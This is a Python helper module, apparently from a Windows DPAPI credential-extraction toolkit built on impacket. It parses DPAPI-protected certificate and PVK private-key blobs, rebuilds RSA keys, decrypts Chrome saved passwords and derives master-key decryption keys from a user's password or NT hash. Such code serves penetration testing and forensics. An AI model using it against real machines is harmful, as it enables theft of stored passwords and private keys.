from binascii import hexlify
from hashlib import pbkdf2_hmac
from Cryptodome.Cipher import AES
from Cryptodome.Hash import HMAC, SHA1, MD4
from Cryptodome.PublicKey import RSA
from Cryptodome.Util.number import bytes_to_long
from impacket.dpapi import DPAPI_BLOB
from impacket.structure import Structure

# https://blog.nviso.eu/2019/08/28/extracting-certificates-from-the-windows-registry/
# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpef/e051aba9-c9df-4f82-a42a-c13012c9d381
# WARNING: CRAPPY STRUCT INCOMING
class CERTBLOB(Structure):
    structure = (
        ('Unk1Type', '<II=0'),
        ('Unk1Len', '<I=0'),
        ('_Unk1', '_-Unk1', 'self["Unk1Len"]'),
        ('Unk1', ':'),
        ('Unk2Type', '<II=0'),
        ('Unk2Len', '<I=0'),
        ('_Unk2', '_-Unk2', 'self["Unk2Len"]'),
        ('Unk2', ':'),
        ('Unk3Type', '<II=0'),
        ('Unk3Len', '<I=0'),
        ('_Unk3', '_-Unk3', 'self["Unk3Len"]'),
        ('Unk3', ':'),
        ('Unk4Type', '<II=0'),
        ('Unk4Len', '<I=0'),
        ('_Unk4', '_-Unk4', 'self["Unk4Len"]'),
        ('Unk4', ':'),
        ('Unk5Type', '<II=0'),
        ('Unk5Len', '<I=0'),
        ("_Unk5", "_-Unk5", 'self["Unk5Len"]'),
        ("Unk5", ':'),
        ('Unk6Type', '<II=0'),
        ('Unk6Len', '<I=0'),
        ("_Unk6", "_-Unk6", 'self["Unk6Len"]'),
        ("Unk6", ':'),
        ('Unk7Type', '<II=0'),
        ('Unk7Len', '<I=0'),
        ("_Unk7", "_-Unk7", 'self["Unk7Len"]'),
        ("Unk7", ':'),
        ('Unk8Type', '<II=0'),
        ('Unk8Len', '<I=0'),
        ("_Unk8", "_-Unk8", 'self["Unk8Len"]'),
        ("Unk8", ':'),
        ('Unk9Type', '<II=0'),
        ('Unk9Len', '<I=0'),
        ("_Unk9", "_-Unk9", 'self["Unk9Len"]'),
        ("Unk9", ':'),
        ('Unk10Type', '<II=0'),
        ('Unk10Len', '<I=0'),
        ("_Unk10", "_-Unk10", 'self["Unk10Len"]'),
        ("Unk10", ':'),
        ('DERType', '<II=0'),
        ('DERLen', '<I=0'),
        ('_DER', '_-DER', 'self["DERLen"]'),
        ('DER', ':'),
    )

    def dump(self):
        print("DER             : %s " % (self['DER']))

class SYSTEMCERTBLOB(Structure):
    structure = (
        ('Unk1Type', '<II=0'),
        ('Unk1Len', '<I=0'),
        ('_Unk1', '_-Unk1', 'self["Unk1Len"]'),
        ('Unk1', ':'),
        ('Unk2Type', '<II=0'),
        ('Unk2Len', '<I=0'),
        ('_Unk2', '_-Unk2', 'self["Unk2Len"]'),
        ('Unk2', ':'),
        ('Unk3Type', '<II=0'),
        ('Unk3Len', '<I=0'),
        ('_Unk3', '_-Unk3', 'self["Unk3Len"]'),
        ('Unk3', ':'),
        ('Unk4Type', '<II=0'),
        ('Unk4Len', '<I=0'),
        ('_Unk4', '_-Unk4', 'self["Unk4Len"]'),
        ('Unk4', ':'),
        ('Unk5Type', '<II=0'),
        ('Unk5Len', '<I=0'),
        ("_Unk5", "_-Unk5", 'self["Unk5Len"]'),
        ("Unk5", ':'),
        ('Unk6Type', '<II=0'),
        ('Unk6Len', '<I=0'),
        ("_Unk6", "_-Unk6", 'self["Unk6Len"]'),
        ("Unk6", ':'),
        ('Unk7Type', '<II=0'),
        ('Unk7Len', '<I=0'),
        ("_Unk7", "_-Unk7", 'self["Unk7Len"]'),
        ("Unk7", ':'),
        ('Unk8Type', '<II=0'),
        ('Unk8Len', '<I=0'),
        ("_Unk8", "_-Unk8", 'self["Unk8Len"]'),
        ("Unk8", ':'),
        ('Unk9Type', '<II=0'),
        ('Unk9Len', '<I=0'),
        ("_Unk9", "_-Unk9", 'self["Unk9Len"]'),
        ("Unk9", ':'),
        ('Unk10Type', '<II=0'),
        ('Unk10Len', '<I=0'),
        ("_Unk10", "_-Unk10", 'self["Unk10Len"]'),
        ("Unk10", ':'),
        ('Unk11Type', '<II=0'),
        ('Unk11Len', '<I=0'),
        ("_Unk11", "_-Unk11", 'self["Unk11Len"]'),
        ("Unk11", ':'),
        ('DERType', '<II=0'),
        ('DERLen', '<I=0'),
        ('_DER', '_-DER', 'self["DERLen"]'),
        ('DER', ':'),
    )

    def dump(self):
        print("DER             : %s " % (self['DER']))

# https://github.com/SecureAuthCorp/impacket/pull/1120
# Private Decrypted Private Key 
class PRIVATE_KEY_RSA(Structure):
    structure = (
        ('magic', '<L=0'),
        ('len1', '<L=0'),
        ('bitlen', '<L=0'),
        ('unk', '<L=0'),
        ('pubexp', '<L=0'),
        ('_modulus', '_-modulus', 'self["len1"]'),
        ('modulus', ':'),
        ('_prime1', '_-prime1', 'self["len1"] // 2'),
        ('prime1', ':'),
        ('_prime2', '_-prime2', 'self["len1"] // 2'),
        ('prime2', ':'),
        ('_exponent1', '_-exponent1', 'self["len1"] // 2'),
        ('exponent1', ':'),
        ('_exponent2', '_-exponent2', 'self["len1"]// 2'),
        ('exponent2', ':'),
        ('_coefficient', '_-coefficient', 'self["len1"] // 2'),
        ('coefficient', ':'),
        ('_privateExponent', '_-privateExponent', 'self["len1"]'),
        ('privateExponent', ':'),
    )
    def dump(self):
        print("magic             : %s " % ( self['magic']))
        print("len1              : %8x (%d)" % (self['len1'], self['len1']))
        print("bitlen            : %8x (%d)" % (self['bitlen'], self['bitlen']))
        print("pubexp            : %8x, (%d)" % (self['pubexp'], self['pubexp']))
        print("modulus           : %s" % (hexlify( self['modulus'])))
        print("prime1            : %s" % (hexlify( self['prime1'])))
        print("prime2            : %s" % (hexlify( self['prime2'])))
        print("exponent1         : %s" % (hexlify( self['exponent1'])))
        print("exponent2         : %s" % (hexlify( self['exponent2'])))
        print("coefficient       : %s" % (hexlify( self['coefficient'])))
        print("privateExponent   : %s" % (hexlify( self['privateExponent'])))
    def __init__(self, data = None, alignment = 0):
        Structure.__init__(self, data, alignment)
        chunk = int(self['bitlen'] / 16)
        self['modulus']= self['modulus'][:chunk * 2]
        self['prime1']= self['prime1'][:chunk]
        self['prime2']= self['prime2'][:chunk]
        self['exponent1']= self['exponent1'][:chunk]
        self['exponent2']= self['exponent2'][:chunk]
        self['coefficient']= self['coefficient'][:chunk]
        self['privateExponent']= self['privateExponent'][:chunk * 2]

# PVK DPAPI BLOB when it has the SIG data
class PVKFile_SIG(Structure):
    structure = (
        ('Version', '<L=0'),
        ('unk1', '<L=0'),
        ('descrLen', '<L=0'),
        ('SigHeadLen', "<L=0"),
        ('SigPrivKeyLen', '<L=0'),
        ('HeaderLen', '<L=0'),
        ('PrivKeyLen', '<L=0'),
        ('crcLen', '<L=0'),
        ('SigFlagsLen', '<L=0'),
        ('FlagsLen', '<L=0'),
        ('_Description', '_-Description', 'self["descrLen"]'),
        ('Description', ':'),
        ('unk2', '<LLLLL=0'),
        ('_Rsaheader_new', '_-Rsaheader_new', 'self["SigHeadLen"]' ),
        ('Rsaheader_new', ':'),                                            
        ('_Blob', '_-Blob', 'self["SigPrivKeyLen"]'),
        ('Blob', ':', DPAPI_BLOB),
        ('_ExportFlag', '_-ExportFlag', 'self["SigFlagsLen"]'),
        ('ExportFlag', ':', DPAPI_BLOB), 
    )

    def dump(self):
        print("[PVKFILE]")
        print("[RSAHEADER]")
        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
        print("SigHeadLen         : %8x (%d)" % (self['SigHeadLen'], self['SigHeadLen']))
        print("SigPrivKeyLen      : %8x (%d)" % (self['SigPrivKeyLen'], self['SigPrivKeyLen']))
        print("HeaderLen          : %.8x (%d)" % (self['HeaderLen'], self['HeaderLen']))
        print("PrivKeyLen         : %.8x (%d)" % (self['PrivKeyLen'], self['PrivKeyLen']))
        print("crcLen             : %.8x (%d)" % (self['crcLen'], self['crcLen']))
        print("SigFlagsLen        : %.8x (%d)" % (self['SigFlagsLen'], self['SigFlagsLen']))
        print("FlagsLen           : %.8x (%d)" % (self['FlagsLen'], self['FlagsLen']))
        print("Description   : %s" % (self['Description']))
        print("Blank   : %s" % (self['unk2']))
        print("RsaHeader : %s" %    (hexlify(self['Rsaheader_new']).decode('latin-1')))
        print("[PRIVATE KEY]")
        print (self['Blob'].dump())
        print("[FLAGS]")
        print (self['ExportFlag'].dump())

# PVK DPAPI BLOB without SIG
class PVKFile(Structure):
    structure = (
        ('Version', '<L=0'),
        ('unk1', '<L=0'),
        ('descrLen', '<L=0'),
        ('SiPublicKeyLen', "<L=0"),
        ('SiPrivKeyLen', '<L=0'),
        ('ExPublicKeyLen', '<L=0'),
        ('ExPrivKeyLen', '<L=0'),
        ('HashLen', '<L=0'),
        ('SiExportFlagLen', '<L=0'),
        ('ExExportFlagLen', '<L=0'),
        ('_Description', '_-Description', 'self["descrLen"]'),
        ('Description', ':'),
        ('unk2', '<LLLLL=0'),
        ('_PublicKey', '_-PublicKey', 'self["ExPublicKeyLen"]' ),
        ('PublicKey', ':'),
        ('_Blob', '_-Blob', 'self["ExPrivKeyLen"]'),
        ('Blob', ':', DPAPI_BLOB),
        ('_ExportFlag', '_-ExportFlag', 'self["ExExportFlagLen"]'),
        ('ExportFlag', ':', DPAPI_BLOB), 


    )
    def dump(self):
        print("[PVKFILE]")
        print("[RSAHEADER]")
        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
        print("SiPublicKeyLen         : %8x (%d)" % (self['SiPublicKeyLen'], self['SiPublicKeyLen']))
        print("SiPrivKeyLen      : %8x (%d)" % (self['SiPrivKeyLen'], self['SiPrivKeyLen']))
        print("ExPublicKeyLen          : %.8x (%d)" % (self['ExPublicKeyLen'], self['ExPublicKeyLen']))
        print("ExPrivKeyLen         : %.8x (%d)" % (self['ExPrivKeyLen'], self['ExPrivKeyLen']))
        print("HashLen             : %.8x (%d)" % (self['HashLen'], self['HashLen']))
        print("SiExportFlagLen        : %.8x (%d)" % (self['SiExportFlagLen'], self['SiExportFlagLen']))
        print("ExExportFlagLen           : %.8x (%d)" % (self['ExExportFlagLen'], self['ExExportFlagLen']))
        print("Description   : %s" % (self['Description']))
        print("Blank   : %s" % (self['unk2']))
        print("PublicKey : %s" %    (hexlify(self['PublicKey']).decode('latin-1')))
        print("[PRIVATE KEY]")
        print (self['Blob'].dump())
        print("[FLAGS]")
        print (self['ExportFlag'].dump())

# This class is the same as the previous two, its only used to see wich one of the previous clasess we will use
# sorry 
class PVKHeader(Structure):
    structure = (
        ('Version', '<L=0'),
        ('unk1', '<L=0'),
        ('descrLen', '<L=0'),
        ('SigHeadLen', "<L=0"),
        ('SigPrivKeyLen', '<L=0'),
        ('HeaderLen', '<L=0'),
        ('PrivKeyLen', '<L=0'),
        ('crcLen', '<L=0'),
        ('SigFlagsLen', '<L=0'),
        ('FlagsLen', '<L=0'),
        ('_Description', '_-Description', 'self["descrLen"]'),
        ('Description', ':'),
        ('unk2', '<LLLLL=0'),

        ('Remaining', ':'),

    )
    def dump(self):
        print("[PVKFILE]")
        print("[RSAHEADER]")
        print("Version            : %8x (%d)" % (self['Version'], self['Version']))
        print("descrLen           : %8x (%d)" % (self['descrLen'], self['descrLen'] ))
        print("SigHeadLen         : %8x (%d)" % (self['SigHeadLen'], self['SigHeadLen']))
        print("SigPrivKeyLen      : %8x (%d)" % (self['SigPrivKeyLen'], self['SigPrivKeyLen']))
        print("HeaderLen          : %.8x (%d)" % (self['HeaderLen'], self['HeaderLen']))
        print("PrivKeyLen         : %.8x (%d)" % (self['PrivKeyLen'], self['PrivKeyLen']))
        print("crcLen             : %.8x (%d)" % (self['crcLen'], self['crcLen']))
        print("SigFlagsLen        : %.8x (%d)" % (self['SigFlagsLen'], self['SigFlagsLen']))
        print("FlagsLen           : %.8x (%d)" % (self['FlagsLen'], self['FlagsLen']))
        print("Description   : %s" % (self['Description']))

def pvkblob_to_pkcs1(key):
    '''
    modified from impacket dpapi.py
    parse private key into pkcs#1 format
    :param key:
    :return:
    '''
    modulus = bytes_to_long(key['modulus'][::-1]) # n
    prime1 = bytes_to_long(key['prime1'][::-1]) # p
    prime2 = bytes_to_long(key['prime2'][::-1]) # q
    exp1 = bytes_to_long(key['exponent1'][::-1])
    exp2 = bytes_to_long(key['exponent2'][::-1])
    coefficient = bytes_to_long(key['coefficient'][::-1])
    privateExp = bytes_to_long(key['privateExponent'][::-1]) # d
    pubExp = int(key['pubexp']) # e
    # RSA.Integer(prime2).inverse(prime1) # u

    r = RSA.construct((modulus, pubExp, privateExp, prime1, prime2))
    return r

def decrypt_chrome_password(encrypted_password: str, aeskey: bytes):
    if encrypted_password[:3]==b'v10' or encrypted_password[:3]==b'v11':
        iv = encrypted_password[3:3 + 12]
        payload = encrypted_password[15:]
        cipher = AES.new(aeskey, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)[:-16]
        decrypted = decrypted.decode('utf-8')
        if decrypted != None:
            return decrypted
        else:
            return None

def deriveKeysFromUser(sid, password):
    # Will generate two keys, one with SHA1 and another with MD4
    key1 = HMAC.new(SHA1.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
    key2 = HMAC.new(MD4.new(password.encode('utf-16le')).digest(), (sid + '\0').encode('utf-16le'), SHA1).digest()
    # For Protected users
    tmpKey = pbkdf2_hmac('sha256', MD4.new(password.encode('utf-16le')).digest(), sid.encode('utf-16le'), 10000)
    tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
    key3 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]

    return key1, key2, key3

def deriveKeysFromUserkey(sid, nthash):
    key1 = key2 = None
    if len(nthash) == 20:
        # SHA1
        key1 = HMAC.new(nthash, (sid + '\0').encode('utf-16le'), SHA1).digest()
    else:
        # Assume MD4
        key1 = HMAC.new(nthash, (sid + '\0').encode('utf-16le'), SHA1).digest()
        # For Protected users
        tmpKey = pbkdf2_hmac('sha256', nthash, sid.encode('utf-16le'), 10000)
        tmpKey2 = pbkdf2_hmac('sha256', tmpKey, sid.encode('utf-16le'), 1)[:16]
        key2 = HMAC.new(tmpKey2, (sid + '\0').encode('utf-16le'), SHA1).digest()[:20]
    return key1, key2